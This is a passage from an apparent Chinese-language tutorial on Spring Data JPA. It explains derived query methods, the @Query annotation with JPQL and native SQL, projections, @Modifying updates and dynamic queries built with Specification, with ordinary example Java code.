class_">JpaRepository</span>&lt;User, Long&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 根据用户名精确查找用户 (返回单个对象)</span></span><br><span class="line">    Optional&lt;User&gt; <span class="title function_">findByUsername</span><span class="params">(String username)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 根据用户名和状态查找用户列表</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findByUsernameAndStatus</span><span class="params">(String username, UserStatus status)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 根据年龄大于某个值，并按创建时间降序排序</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findByAgeGreaterThanOrderByCreateTimeDesc</span><span class="params">(<span class="type">int</span> age)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 根据用户名模糊查询（忽略大小写）</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findByUsernameContainingIgnoreCase</span><span class="params">(String keyword)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 查询某个日期之后创建的用户数量</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">countByCreateTimeAfter</span><span class="params">(LocalDateTime dateTime)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 查找状态为ACTIVE的前5个用户</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findTop5ByStatus</span><span class="params">(UserStatus status)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 判断是否存在某个邮箱的用户</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">existsByEmail</span><span class="params">(String email)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8. 根据ID列表批量删除用户</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">deleteByIdIn</span><span class="params">(List&lt;Long&gt; ids)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优势</strong>:</p>
<ul>
<li><strong>零SQL</strong>: 无需编写任何JPQL或SQL，完全避免了拼写错误。</li>
<li><strong>类型安全</strong>: 方法参数是强类型的，IDE和编译器可以进行检查。</li>
<li><strong>代码即文档</strong>: 方法名本身就清晰地描述了查询的目的，可读性极高。</li>
<li><strong>易于重构</strong>: 如果实体字段名发生变化，IDE的重构工具可以自动更新方法名。</li>
</ul>
<p><strong>局限性</strong>:</p>
<ul>
<li>对于<strong>非常复杂</strong>的查询（如多表连接、子查询、复杂的聚合函数），方法名会变得<strong>异常冗长且难以理解</strong>。</li>
<li>无法实现动态查询（即查询条件根据输入动态增减）。</li>
</ul>
<hr>
<h4 id="3-3-2-Query-注解"><a href="#3-3-2-Query-注解" class="headerlink" title="3.3.2 @Query 注解"></a>3.3.2 <code>@Query</code> 注解</h4><h5 id="1-为什么需要-Query？"><a href="#1-为什么需要-Query？" class="headerlink" title="1. 为什么需要 @Query？"></a>1. 为什么需要 <code>@Query</code>？</h5><p>虽然方法命名查询非常便捷，但它有其局限性：</p>
<ol>
<li><strong>复杂查询的表达能力不足</strong>: 对于涉及多表<code>JOIN</code>、子查询、<code>GROUP BY</code>、<code>HAVING</code>或复杂聚合函数的查询，如果硬要用方法名来表示，方法名会变得极其冗长、难以阅读和维护。</li>
<li><strong>查询逻辑固定</strong>: 方法名一旦定义，其查询逻辑就是固定的。它无法处理动态的、根据输入参数有选择性地添加查询条件的需求。</li>
<li><strong>非实体字段查询</strong>: 方法命名查询默认只能查询实体的所有字段。如果你只想查询部分字段（投影查询），或者进行一些计算，方法命名查询就无能为力了。</li>
</ol>
<p><code>@Query</code> 注解就是为了解决这些问题而生的。它允许你<strong>直接在Repository接口的方法上，编写自定义的JPQL（Java Persistence Query Language）或原生SQL语句</strong>，从而获得对查询逻辑的完全控制权。</p>
<hr>
<h5 id="2-使用JPQL-Java-Persistence-Query-Language"><a href="#2-使用JPQL-Java-Persistence-Query-Language" class="headerlink" title="2. 使用JPQL (Java Persistence Query Language)"></a>2. 使用JPQL (Java Persistence Query Language)</h5><p>JPQL是一种<strong>面向对象</strong>的查询语言，语法与SQL非常相似，但它是<strong>针对实体（Entity）和实体的属性</strong>进行查询的，而不是直接操作数据库的表和列。这是使用<code>@Query</code>的首选和最常用的方式。</p>
<h6 id="a-基本用法"><a href="#a-基本用法" class="headerlink" title="a. 基本用法"></a>a. 基本用法</h6><ul>
<li>在Repository接口的方法上添加 <code>@Query</code> 注解。</li>
<li>将JPQL语句作为注解的 <code>value</code> 属性值。</li>
<li>使用<strong>位置参数</strong> (<code>?</code> + 索引，从1开始) 或 <strong>命名参数</strong> (<code>:</code> + 参数名) 来引用方法参数。</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;User, Long&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 使用位置参数 (?1, ?2, ...)</span></span><br><span class="line">    <span class="meta">@Query(&quot;SELECT u FROM User u WHERE u.username = ?1 AND u.status = ?2&quot;)</span></span><br><span class="line">    Optional&lt;User&gt; <span class="title function_">findUserByUsernameAndStatus</span><span class="params">(String username, UserStatus status)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 使用命名参数 (:paramName) - 更推荐，可读性更好</span></span><br><span class="line">    <span class="comment">//    需要配合 @Param 注解来绑定方法参数</span></span><br><span class="line">    <span class="meta">@Query(&quot;SELECT u FROM User u WHERE u.email LIKE :emailPattern&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findUsersWithEmailLike</span><span class="params">(<span class="meta">@Param(&quot;emailPattern&quot;)</span> String emailPattern)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 注意：</span></span><br><span class="line">    <span class="comment">// - &quot;User&quot; 是实体类的名字，不是表名 &quot;users&quot;。</span></span><br><span class="line">    <span class="comment">// - &quot;u.username&quot; 是实体类的字段名，不是列名 &quot;user_name&quot;。</span></span><br><span class="line">    <span class="comment">// - JPQL是大小写敏感的 (对于实体名和属性名)。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>@Param(&quot;...&quot;)</code></strong>: 用于将方法的参数与JPQL中的命名参数进行绑定。如果方法参数名与命名参数名一致，在较新版本的Spring Data JPA中可以省略<code>@Param</code>，但显式指定是最佳实践。</li>
</ul>
<hr>
<h6 id="b-投影查询-只查询部分字段"><a href="#b-投影查询-只查询部分字段" class="headerlink" title="b. 投影查询 (只查询部分字段)"></a>b. 投影查询 (只查询部分字段)</h6><p>你可以直接在 <code>SELECT</code> 子句中指定要查询的字段。如果返回的是多个字段，通常需要将它们封装到一个DTO（Data Transfer Object）或接口中。</p>
<p><strong>返回DTO (构造函数表达式)</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UserSummaryDTO.java (必须有一个与JPQL中NEW后面的构造函数参数匹配的构造器)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserSummaryDTO</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="comment">// Constructor, Getters...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UserRepository.java</span></span><br><span class="line"><span class="meta">@Query(&quot;SELECT new com.example.dto.UserSummaryDTO(u.username, u.email) FROM User u WHERE u.id = :id&quot;)</span></span><br><span class="line">UserSummaryDTO <span class="title function_">findUserSummaryById</span><span class="params">(<span class="meta">@Param(&quot;id&quot;)</span> Long id)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>返回接口 (Interface-based Projections)</strong>:</p>
<p>这是一种更简洁的方式，你只需要定义一个接口。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个只包含需要字段的getter方法的接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserProjection</span> &#123;</span><br><span class="line">    String <span class="title function_">getUsername</span><span class="params">()</span>;</span><br><span class="line">    String <span class="title function_">getEmail</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UserRepository.java</span></span><br><span class="line"><span class="meta">@Query(&quot;SELECT u FROM User u WHERE u.id = :id&quot;)</span></span><br><span class="line">UserProjection <span class="title function_">findUserProjectionById</span><span class="params">(<span class="meta">@Param(&quot;id&quot;)</span> Long id)</span>;</span><br></pre></td></tr></table></figure>

<p>Spring Data JPA会自动创建一个代理实现来填充这个接口。</p>
<hr>
<h6 id="c-更新和删除操作-Modifying"><a href="#c-更新和删除操作-Modifying" class="headerlink" title="c. 更新和删除操作 (@Modifying)"></a>c. 更新和删除操作 (<code>@Modifying</code>)</h6><p>如果你想通过 <code>@Query</code> 执行 <code>UPDATE</code> 或 <code>DELETE</code> 操作，必须满足两个条件：</p>
<ol>
<li>在 <code>@Query</code> 注解旁边，额外添加 <strong><code>@Modifying</code></strong> 注解。</li>
<li>该方法必须在一个<strong>事务</strong>中执行（通常在Service层的方法上添加 <code>@Transactional</code>）。</li>
</ol>
<p><code>@Modifying</code> 注解告诉Spring Data，这个查询将要<strong>修改数据库状态</strong>。</p>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.Modifying;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;User, Long&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Modifying</span></span><br><span class="line">    <span class="meta">@Query(&quot;UPDATE User u SET u.status = :newStatus WHERE u.lastLoginTime &lt; :cutoffDate&quot;)</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">updateStatusForInactiveUsers</span><span class="params">(<span class="meta">@Param(&quot;newStatus&quot;)</span> UserStatus newStatus, </span></span><br><span class="line"><span class="params">                                     <span class="meta">@Param(&quot;cutoffDate&quot;)</span> LocalDateTime cutoffDate)</span>;</span><br><span class="line">                                     </span><br><span class="line">    <span class="comment">// 返回值 int 表示受影响的行数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>: 执行 <code>@Modifying</code> 查询后，<strong>持久化上下文（Persistence Context）中的实体可能与数据库中的状态不一致</strong>。如果你需要在同一个事务中继续使用这些被修改的实体，可以设置 <code>@Modifying(clearAutomatically = true)</code> 来自动清空持久化上下文。</p>
<hr>
<h5 id="3-使用原生SQL-Native-SQL"><a href="#3-使用原生SQL-Native-SQL" class="headerlink" title="3. 使用原生SQL (Native SQL)"></a>3. 使用原生SQL (Native SQL)</h5><p>在某些特殊情况下，JPQL可能无法满足需求（例如，使用数据库特有的函数、复杂的查询提示或操作非实体映射的表）。此时，你可以通过<code>@Query</code>执行<strong>原生SQL</strong>。</p>
<ul>
<li><strong>开启原生查询</strong>: 在 <code>@Query</code> 注解中，将 <code>nativeQuery</code> 属性设置为 <code>true</code>。</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;User, Long&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用数据库特有的函数 (例如 MySQL的 DATE_FORMAT)</span></span><br><span class="line">    <span class="comment">// 注意：表名和列名都是数据库中的实际名称</span></span><br><span class="line">    <span class="meta">@Query(value = &quot;SELECT * FROM users u WHERE u.user_name = ?1&quot;, nativeQuery = true)</span></span><br><span class="line">    User <span class="title function_">findByUsernameNative</span><span class="params">(String username)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 投影查询也可以用原生SQL</span></span><br><span class="line">    <span class="meta">@Query(value = &quot;SELECT user_name, email FROM users WHERE id = ?1&quot;, nativeQuery = true)</span></span><br><span class="line">    Map&lt;String, Object&gt; <span class="title function_">findUsernameAndEmailNative</span><span class="params">(Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>原生SQL的缺点</strong>:</p>
<ul>
<li><strong>失去了数据库无关性</strong>: 你的代码将与特定的数据库方言（如MySQL, Oracle）绑定。</li>
<li><strong>类型不安全</strong>: 查询中的表名、列名都是字符串，IDE和编译器无法校验其正确性。</li>
<li><strong>分页和排序的复杂性</strong>: 对于复杂的原生SQL，Spring Data可能无法正确地自动生成<code>COUNT</code>查询，你需要手动提供<code>countQuery</code>或<code>countProjection</code>。</li>
</ul>
<hr>
<h5 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h5><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">方法命名查询</th>
<th align="left"><code>@Query</code> 注解</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>易用性</strong></td>
<td align="left"><strong>极高</strong>，无需编写任何查询语句。</td>
<td align="left"><strong>较高</strong>，需要编写JPQL或SQL，但比原生JDBC简单得多。</td>
</tr>
<tr>
<td align="left"><strong>表达能力</strong></td>
<td align="left"><strong>有限</strong>，适用于中等复杂度的CRUD和条件查询。</td>
<td align="left"><strong>极强</strong>，可以实现任何复杂的查询、更新、删除操作。</td>
</tr>
<tr>
<td align="left"><strong>代码可读性</strong></td>
<td align="left">方法名即文档，<strong>非常清晰</strong>（只要不过于复杂）。</td>
<td align="left">JPQL语句也很清晰，但查询逻辑与方法名分离。</td>
</tr>
<tr>
<td align="left"><strong>维护性</strong></td>
<td align="left"><strong>高</strong>，易于重构。</td>
<td align="left"><strong>中等</strong>，修改查询需要直接编辑字符串，容易出错。</td>
</tr>
<tr>
<td align="left"><strong>适用场景</strong></td>
<td align="left"><strong>80%的日常查询</strong>，特别是简单的条件过滤和排序。</td>
<td align="left"><strong>20%的复杂场景</strong>，如<code>JOIN</code>、投影、批量更新、使用原生SQL等。</td>
</tr>
</tbody></table>
<p><strong>最佳实践</strong>:</p>
<ol>
<li><strong>首选方法命名查询</strong>：对于简单和中等复杂度的查询，优先使用方法命名查询，因为它最简洁、最安全。</li>
<li><strong>次选 <code>@Query</code> + JPQL</strong>：当方法命名查询无法满足需求时，使用 <code>@Query</code> 结合JPQL。这在保持面向对象和一定数据库无关性的同时，提供了强大的查询能力。</li>
<li><strong>最后才考虑 <code>@Query</code> + 原生SQL</strong>：仅在JPQL无法实现特定功能时，才退回到使用原生SQL。</li>
</ol>
<hr>
<h4 id="3-3-3-Specification-动态查询"><a href="#3-3-3-Specification-动态查询" class="headerlink" title="3.3.3 Specification (动态查询)"></a>3.3.3 Specification (动态查询)</h4><h5 id="1-为什么需要-Specification？"><a href="#1-为什么需要-Specification？" class="headerlink" title="1. 为什么需要 Specification？"></a>1. 为什么需要 <code>Specification</code>？</h5><p>在很多业务场景中，我们的查询条件并不是固定的，而是根据用户的输入<strong>动态组合</strong>的。</p>
<p><strong>典型场景：一个复杂的用户搜索功能</strong><br>用户可以在搜索页面上提供以下任意组合的筛选条件：</p>
<ul>
<li>用户名 (模糊匹配)</li>
<li>邮箱 (精确匹配)</li>
<li>状态 (下拉选择)</li>
<li>年龄范围 (大于等于 <code>minAge</code>，小于等于 <code>maxAge</code>)</li>
<li>创建时间的范围</li>
</ul>
<p>如果使用<strong>方法命名查询</strong>，你需要为所有可能的条件组合都创建一个方法，这会导致方法数量爆炸式增长，完全不可行：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// findByUsername(String username);</span></span><br><span class="line"><span class="comment">// findByUsernameAndStatus(String username, Status status);</span></span><br><span class="line"><span class="comment">// findByUsernameAndAgeBetween(String username, int minAge, int maxAge);</span></span><br><span class="line"><span class="comment">// ... 组合会非常多</span></span><br></pre></td></tr></table></figure>

<p>如果使用 <strong><code>@Query</code></strong> 注解，你可以在JPQL中用<code>if</code>语句拼接字符串，但这非常繁琐、容易出错，且有SQL注入的风险（尽管JPA参数绑定能缓解部分问题）。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Service层拼接JPQL字符串，非常不推荐</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jpql</span> <span class="operator">=</span> <span class="string">&quot;SELECT u FROM User u WHERE 1=1 &quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (username != <span class="literal">null</span>) &#123;</span><br><span class="line">    jpql += <span class="string">&quot; AND u.username LIKE :username&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (status != <span class="literal">null</span>) &#123;</span><br><span class="line">    jpql += <span class="string">&quot; AND u.status = :status&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p><strong><code>Specification</code> 就是Spring Data JPA提供的、用于以一种类型安全、面向对象的方式来构建动态查询条件的解决方案。</strong></p>
<hr>
<h5 id="2-核心理念：谓词-Predicate-的组合"><a href="#2-核心理念：谓词-Predicate-的组合" class="headerlink" title="2. 核心理念：谓词 (Predicate) 的组合"></a>2. 核心理念：谓词 (Predicate) 的组合</h5><p><code>Specification</code> 的设计基于 <strong>JPA Criteria API</strong>，它的核心思想是：<strong>将每一个查询条件都看作是一个独立的“谓词 (Predicate)”，然后通过逻辑运算（AND, OR）将这些谓词动态地组合起来，形成一个完整的查询。</strong></p>
<p>一个 <code>Specification&lt;T&gt;</code> 本质上是一个<strong>函数式接口</strong>，它只有一个方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Specification</span>&lt;T&gt; &#123;</span><br><span class="line">    Predicate <span class="title function_">toPredicate</span><span class="params">(Root&lt;T&gt; root, CriteriaQuery&lt;?&gt; query, CriteriaBuilder cb)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>T</code>: 实体类型。</li>
<li><code>toPredicate(...)</code>: 这个方法就是你需要实现的核心。它的职责是根据输入的 <code>root</code>, <code>query</code>, <code>cb</code>，返回一个JPA的 <code>Predicate</code> 对象，这个对象就代表了一个查询条件（如 <code>username = &#39;alice&#39;</code>）。<ul>
<li><strong><code>Root&lt;T&gt; root</code></strong>: 代表了查询的<strong>根对象</strong>（通常是你要查询的实体）。你可以通过 <code>root.get(&quot;fieldName&quot;)</code> 来获取实体的属性。</li>
<li><strong><code>CriteriaQuery&lt;?&gt; query</code></strong>: 代表了整个查询语句。你可以用它来定义<code>ORDER BY</code>, <code>GROUP BY</code>等。</li>
<li><strong><code>CriteriaBuilder cb</code></strong>: 一个<strong>条件构造器工厂</strong>。它是最重要的部分，提供了大量的方法来创建各种类型的谓词，例如：<ul>
<li><code>cb.equal(expression, value)</code>: 等于 (<code>=</code>)</li>
<li><code>cb.like(expression, pattern)</code>: 模糊匹配 (<code>LIKE</code>)</li>
<li><code>cb.greaterThan(expression, value)</code>: 大于 (<code>&gt;</code>)</li>
<li><code>cb.and(predicate1, predicate2)</code>: 逻辑与 (<code>AND</code>)</li>
<li><code>cb.or(predicate1, predicate2)</code>: 逻辑或 (<code>OR</code>)</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h5 id="3-如何使用-Specification"><a href="#3-如何使用-Specification" class="headerlink" title="3. 如何使用 Specification"></a>3. 如何使用 <code>Specification</code></h5><p><strong>Step 1: 让你的Repository接口继承 <code>JpaSpecificationExecutor</code></strong></p>
<p>这个接口提供了执行 <code>Specification</code> 查询所需要的方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaSpecificationExecutor;</span><br><span class="line"></span><br><span class="line"><span class="comment">// JpaSpecificationExecutor&lt;User&gt; 提供了额外的、接收Specification参数的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;User, Long&gt;, JpaSpecificationExecutor&lt;User&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>JpaSpecificationExecutor</code> 提供了如下关键方法：</p>
<ul>
<li><code>Optional&lt;T&gt; findOne(@Nullable Specification&lt;T&gt; spec)</code></li>
<li><code>List&lt;T&gt; findAll(@Nullable Specification&lt;T&gt; spec)</code></li>
<li><code>Page&lt;T&gt; findAll(@Nullable Specification&lt;T&gt; spec, Pageable pageable)</code></li>
<li><code>List&lt;T&gt; findAll(@Nullable Specification&lt;T&gt; spec, Sort sort)</code></li>
<li><code>long count(@Nullable Specification&lt;T&gt; spec)</code></li>
</ul>
<p><strong>Step 2: 在Service层构建 <code>Specification</code></strong></p>
<p>这是最核心的部分。我们通常会在Service层根据传入的参数，动态地构建一个<code>Specification</code>对象。</p>
<p><strong>示例：实现前面提到的用户动态搜索</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">searchUsers</span><span class="params">(UserSearchCriteria criteria)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        Specification&lt;User&gt; spec = (root, query, cb) -&gt; &#123;</span><br><span class="line">            <span class="comment">// 创建一个 Predicate 列表，用于存放所有动态生成的查询条件</span></span><br><span class="line">            List&lt;Predicate&gt; predicates = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 1. 如果用户名不为空，添加 username LIKE &#x27;%...%&#x27; 条件</span></span><br><span class="line">            <span class="keyword">if</span> (criteria.getUsername() != <span class="literal">null</span> &amp;&amp; !criteria.getUsername().isEmpty()) &#123;</span><br><span class="line">                predicates.add(cb.like(root.get(<span class="string">&quot;username&quot;</span>), <span class="string">&quot;%&quot;</span> + criteria.getUsername() + <span class="string">&quot;%&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2. 如果状态不为空，添加 status = &#x27;...&#x27; 条件</span></span><br><span class="line">            <span class="keyword">if</span> (criteria.getStatus() != <span class="literal">null</span>) &#123;</span><br><span class="line">                predicates.add(cb.equal(root.get(<span class="string">&quot;status&quot;</span>), criteria.getStatus()));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3. 如果最小年龄不为空，添加 age &gt;= ... 条件</span></span><br><span class="line">            <span class="keyword">if</span> (criteria.getMinAge() != <span class="literal">null</span>) &#123;</span><br><span class="line">                predicates.add(cb.greaterThanOrEqualTo(root.get(<span class="string">&quot;age&quot;</span>), criteria.getMinAge()));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 4. 如果最大年龄不为空，添加 age &lt;= ... 条件</span></span><br><span class="line">            <span class="keyword">if</span> (criteria.getMaxAge() != <span class="literal">null</span>) &#123;</span><br><span class="line">                predicates.add(cb.lessThanOrEqualTo(root.get(<span class="string">&quot;age&quot;</span>), criteria.getMaxAge()));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// ... 可以添加更多条件</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将所有条件用 AND 连接起来</span></span><br><span class="line">            <span class="comment">// cb.and() 接收一个 Predicate 数组</span></span><br><span class="line">            <span class="keyword">return</span> cb.and(predicates.toArray(<span class="keyword">new</span> <span class="title class_">Predicate</span>[<span class="number">0</span>]));</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用构建好的 Specification 和排序/分页信息进行查询</span></span><br><span class="line">        <span class="keyword">return</span> userRepository.findAll(spec, Sort.by(<span class="string">&quot;createTime&quot;</span>).descending());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>UserSearchCriteria</code> 是一个简单的DTO，用于封装搜索参数。</p>
<p><strong>Step 3 (可选): 将<code>Specification</code>逻辑封装成可复用的单元</strong></p>
<p>为了提高代码的可读性和复用性，我们可以为每个查询条件创建一个独立的<code>Specification</code>，然后在需要时将它们组合起来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个 UserSpecifications 工具类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserSpecifications</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Specification&lt;User&gt; <span class="title function_">usernameContains</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (root, query, cb) -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (username == <span class="literal">null</span> || username.isEmpty()) &#123;</span><br><span class="line">                <span class="keyword">return</span> cb.conjunction(); <span class="comment">// 返回一个恒为 true 的 Predicate</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> cb.like(root.get(<span class="string">&quot;username&quot;</span>), <span class="string">&quot;%&quot;</span> + username + <span class="string">&quot;%&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Specification&lt;User&gt; <span class="title function_">hasStatus</span><span class="params">(UserStatus status)</span> 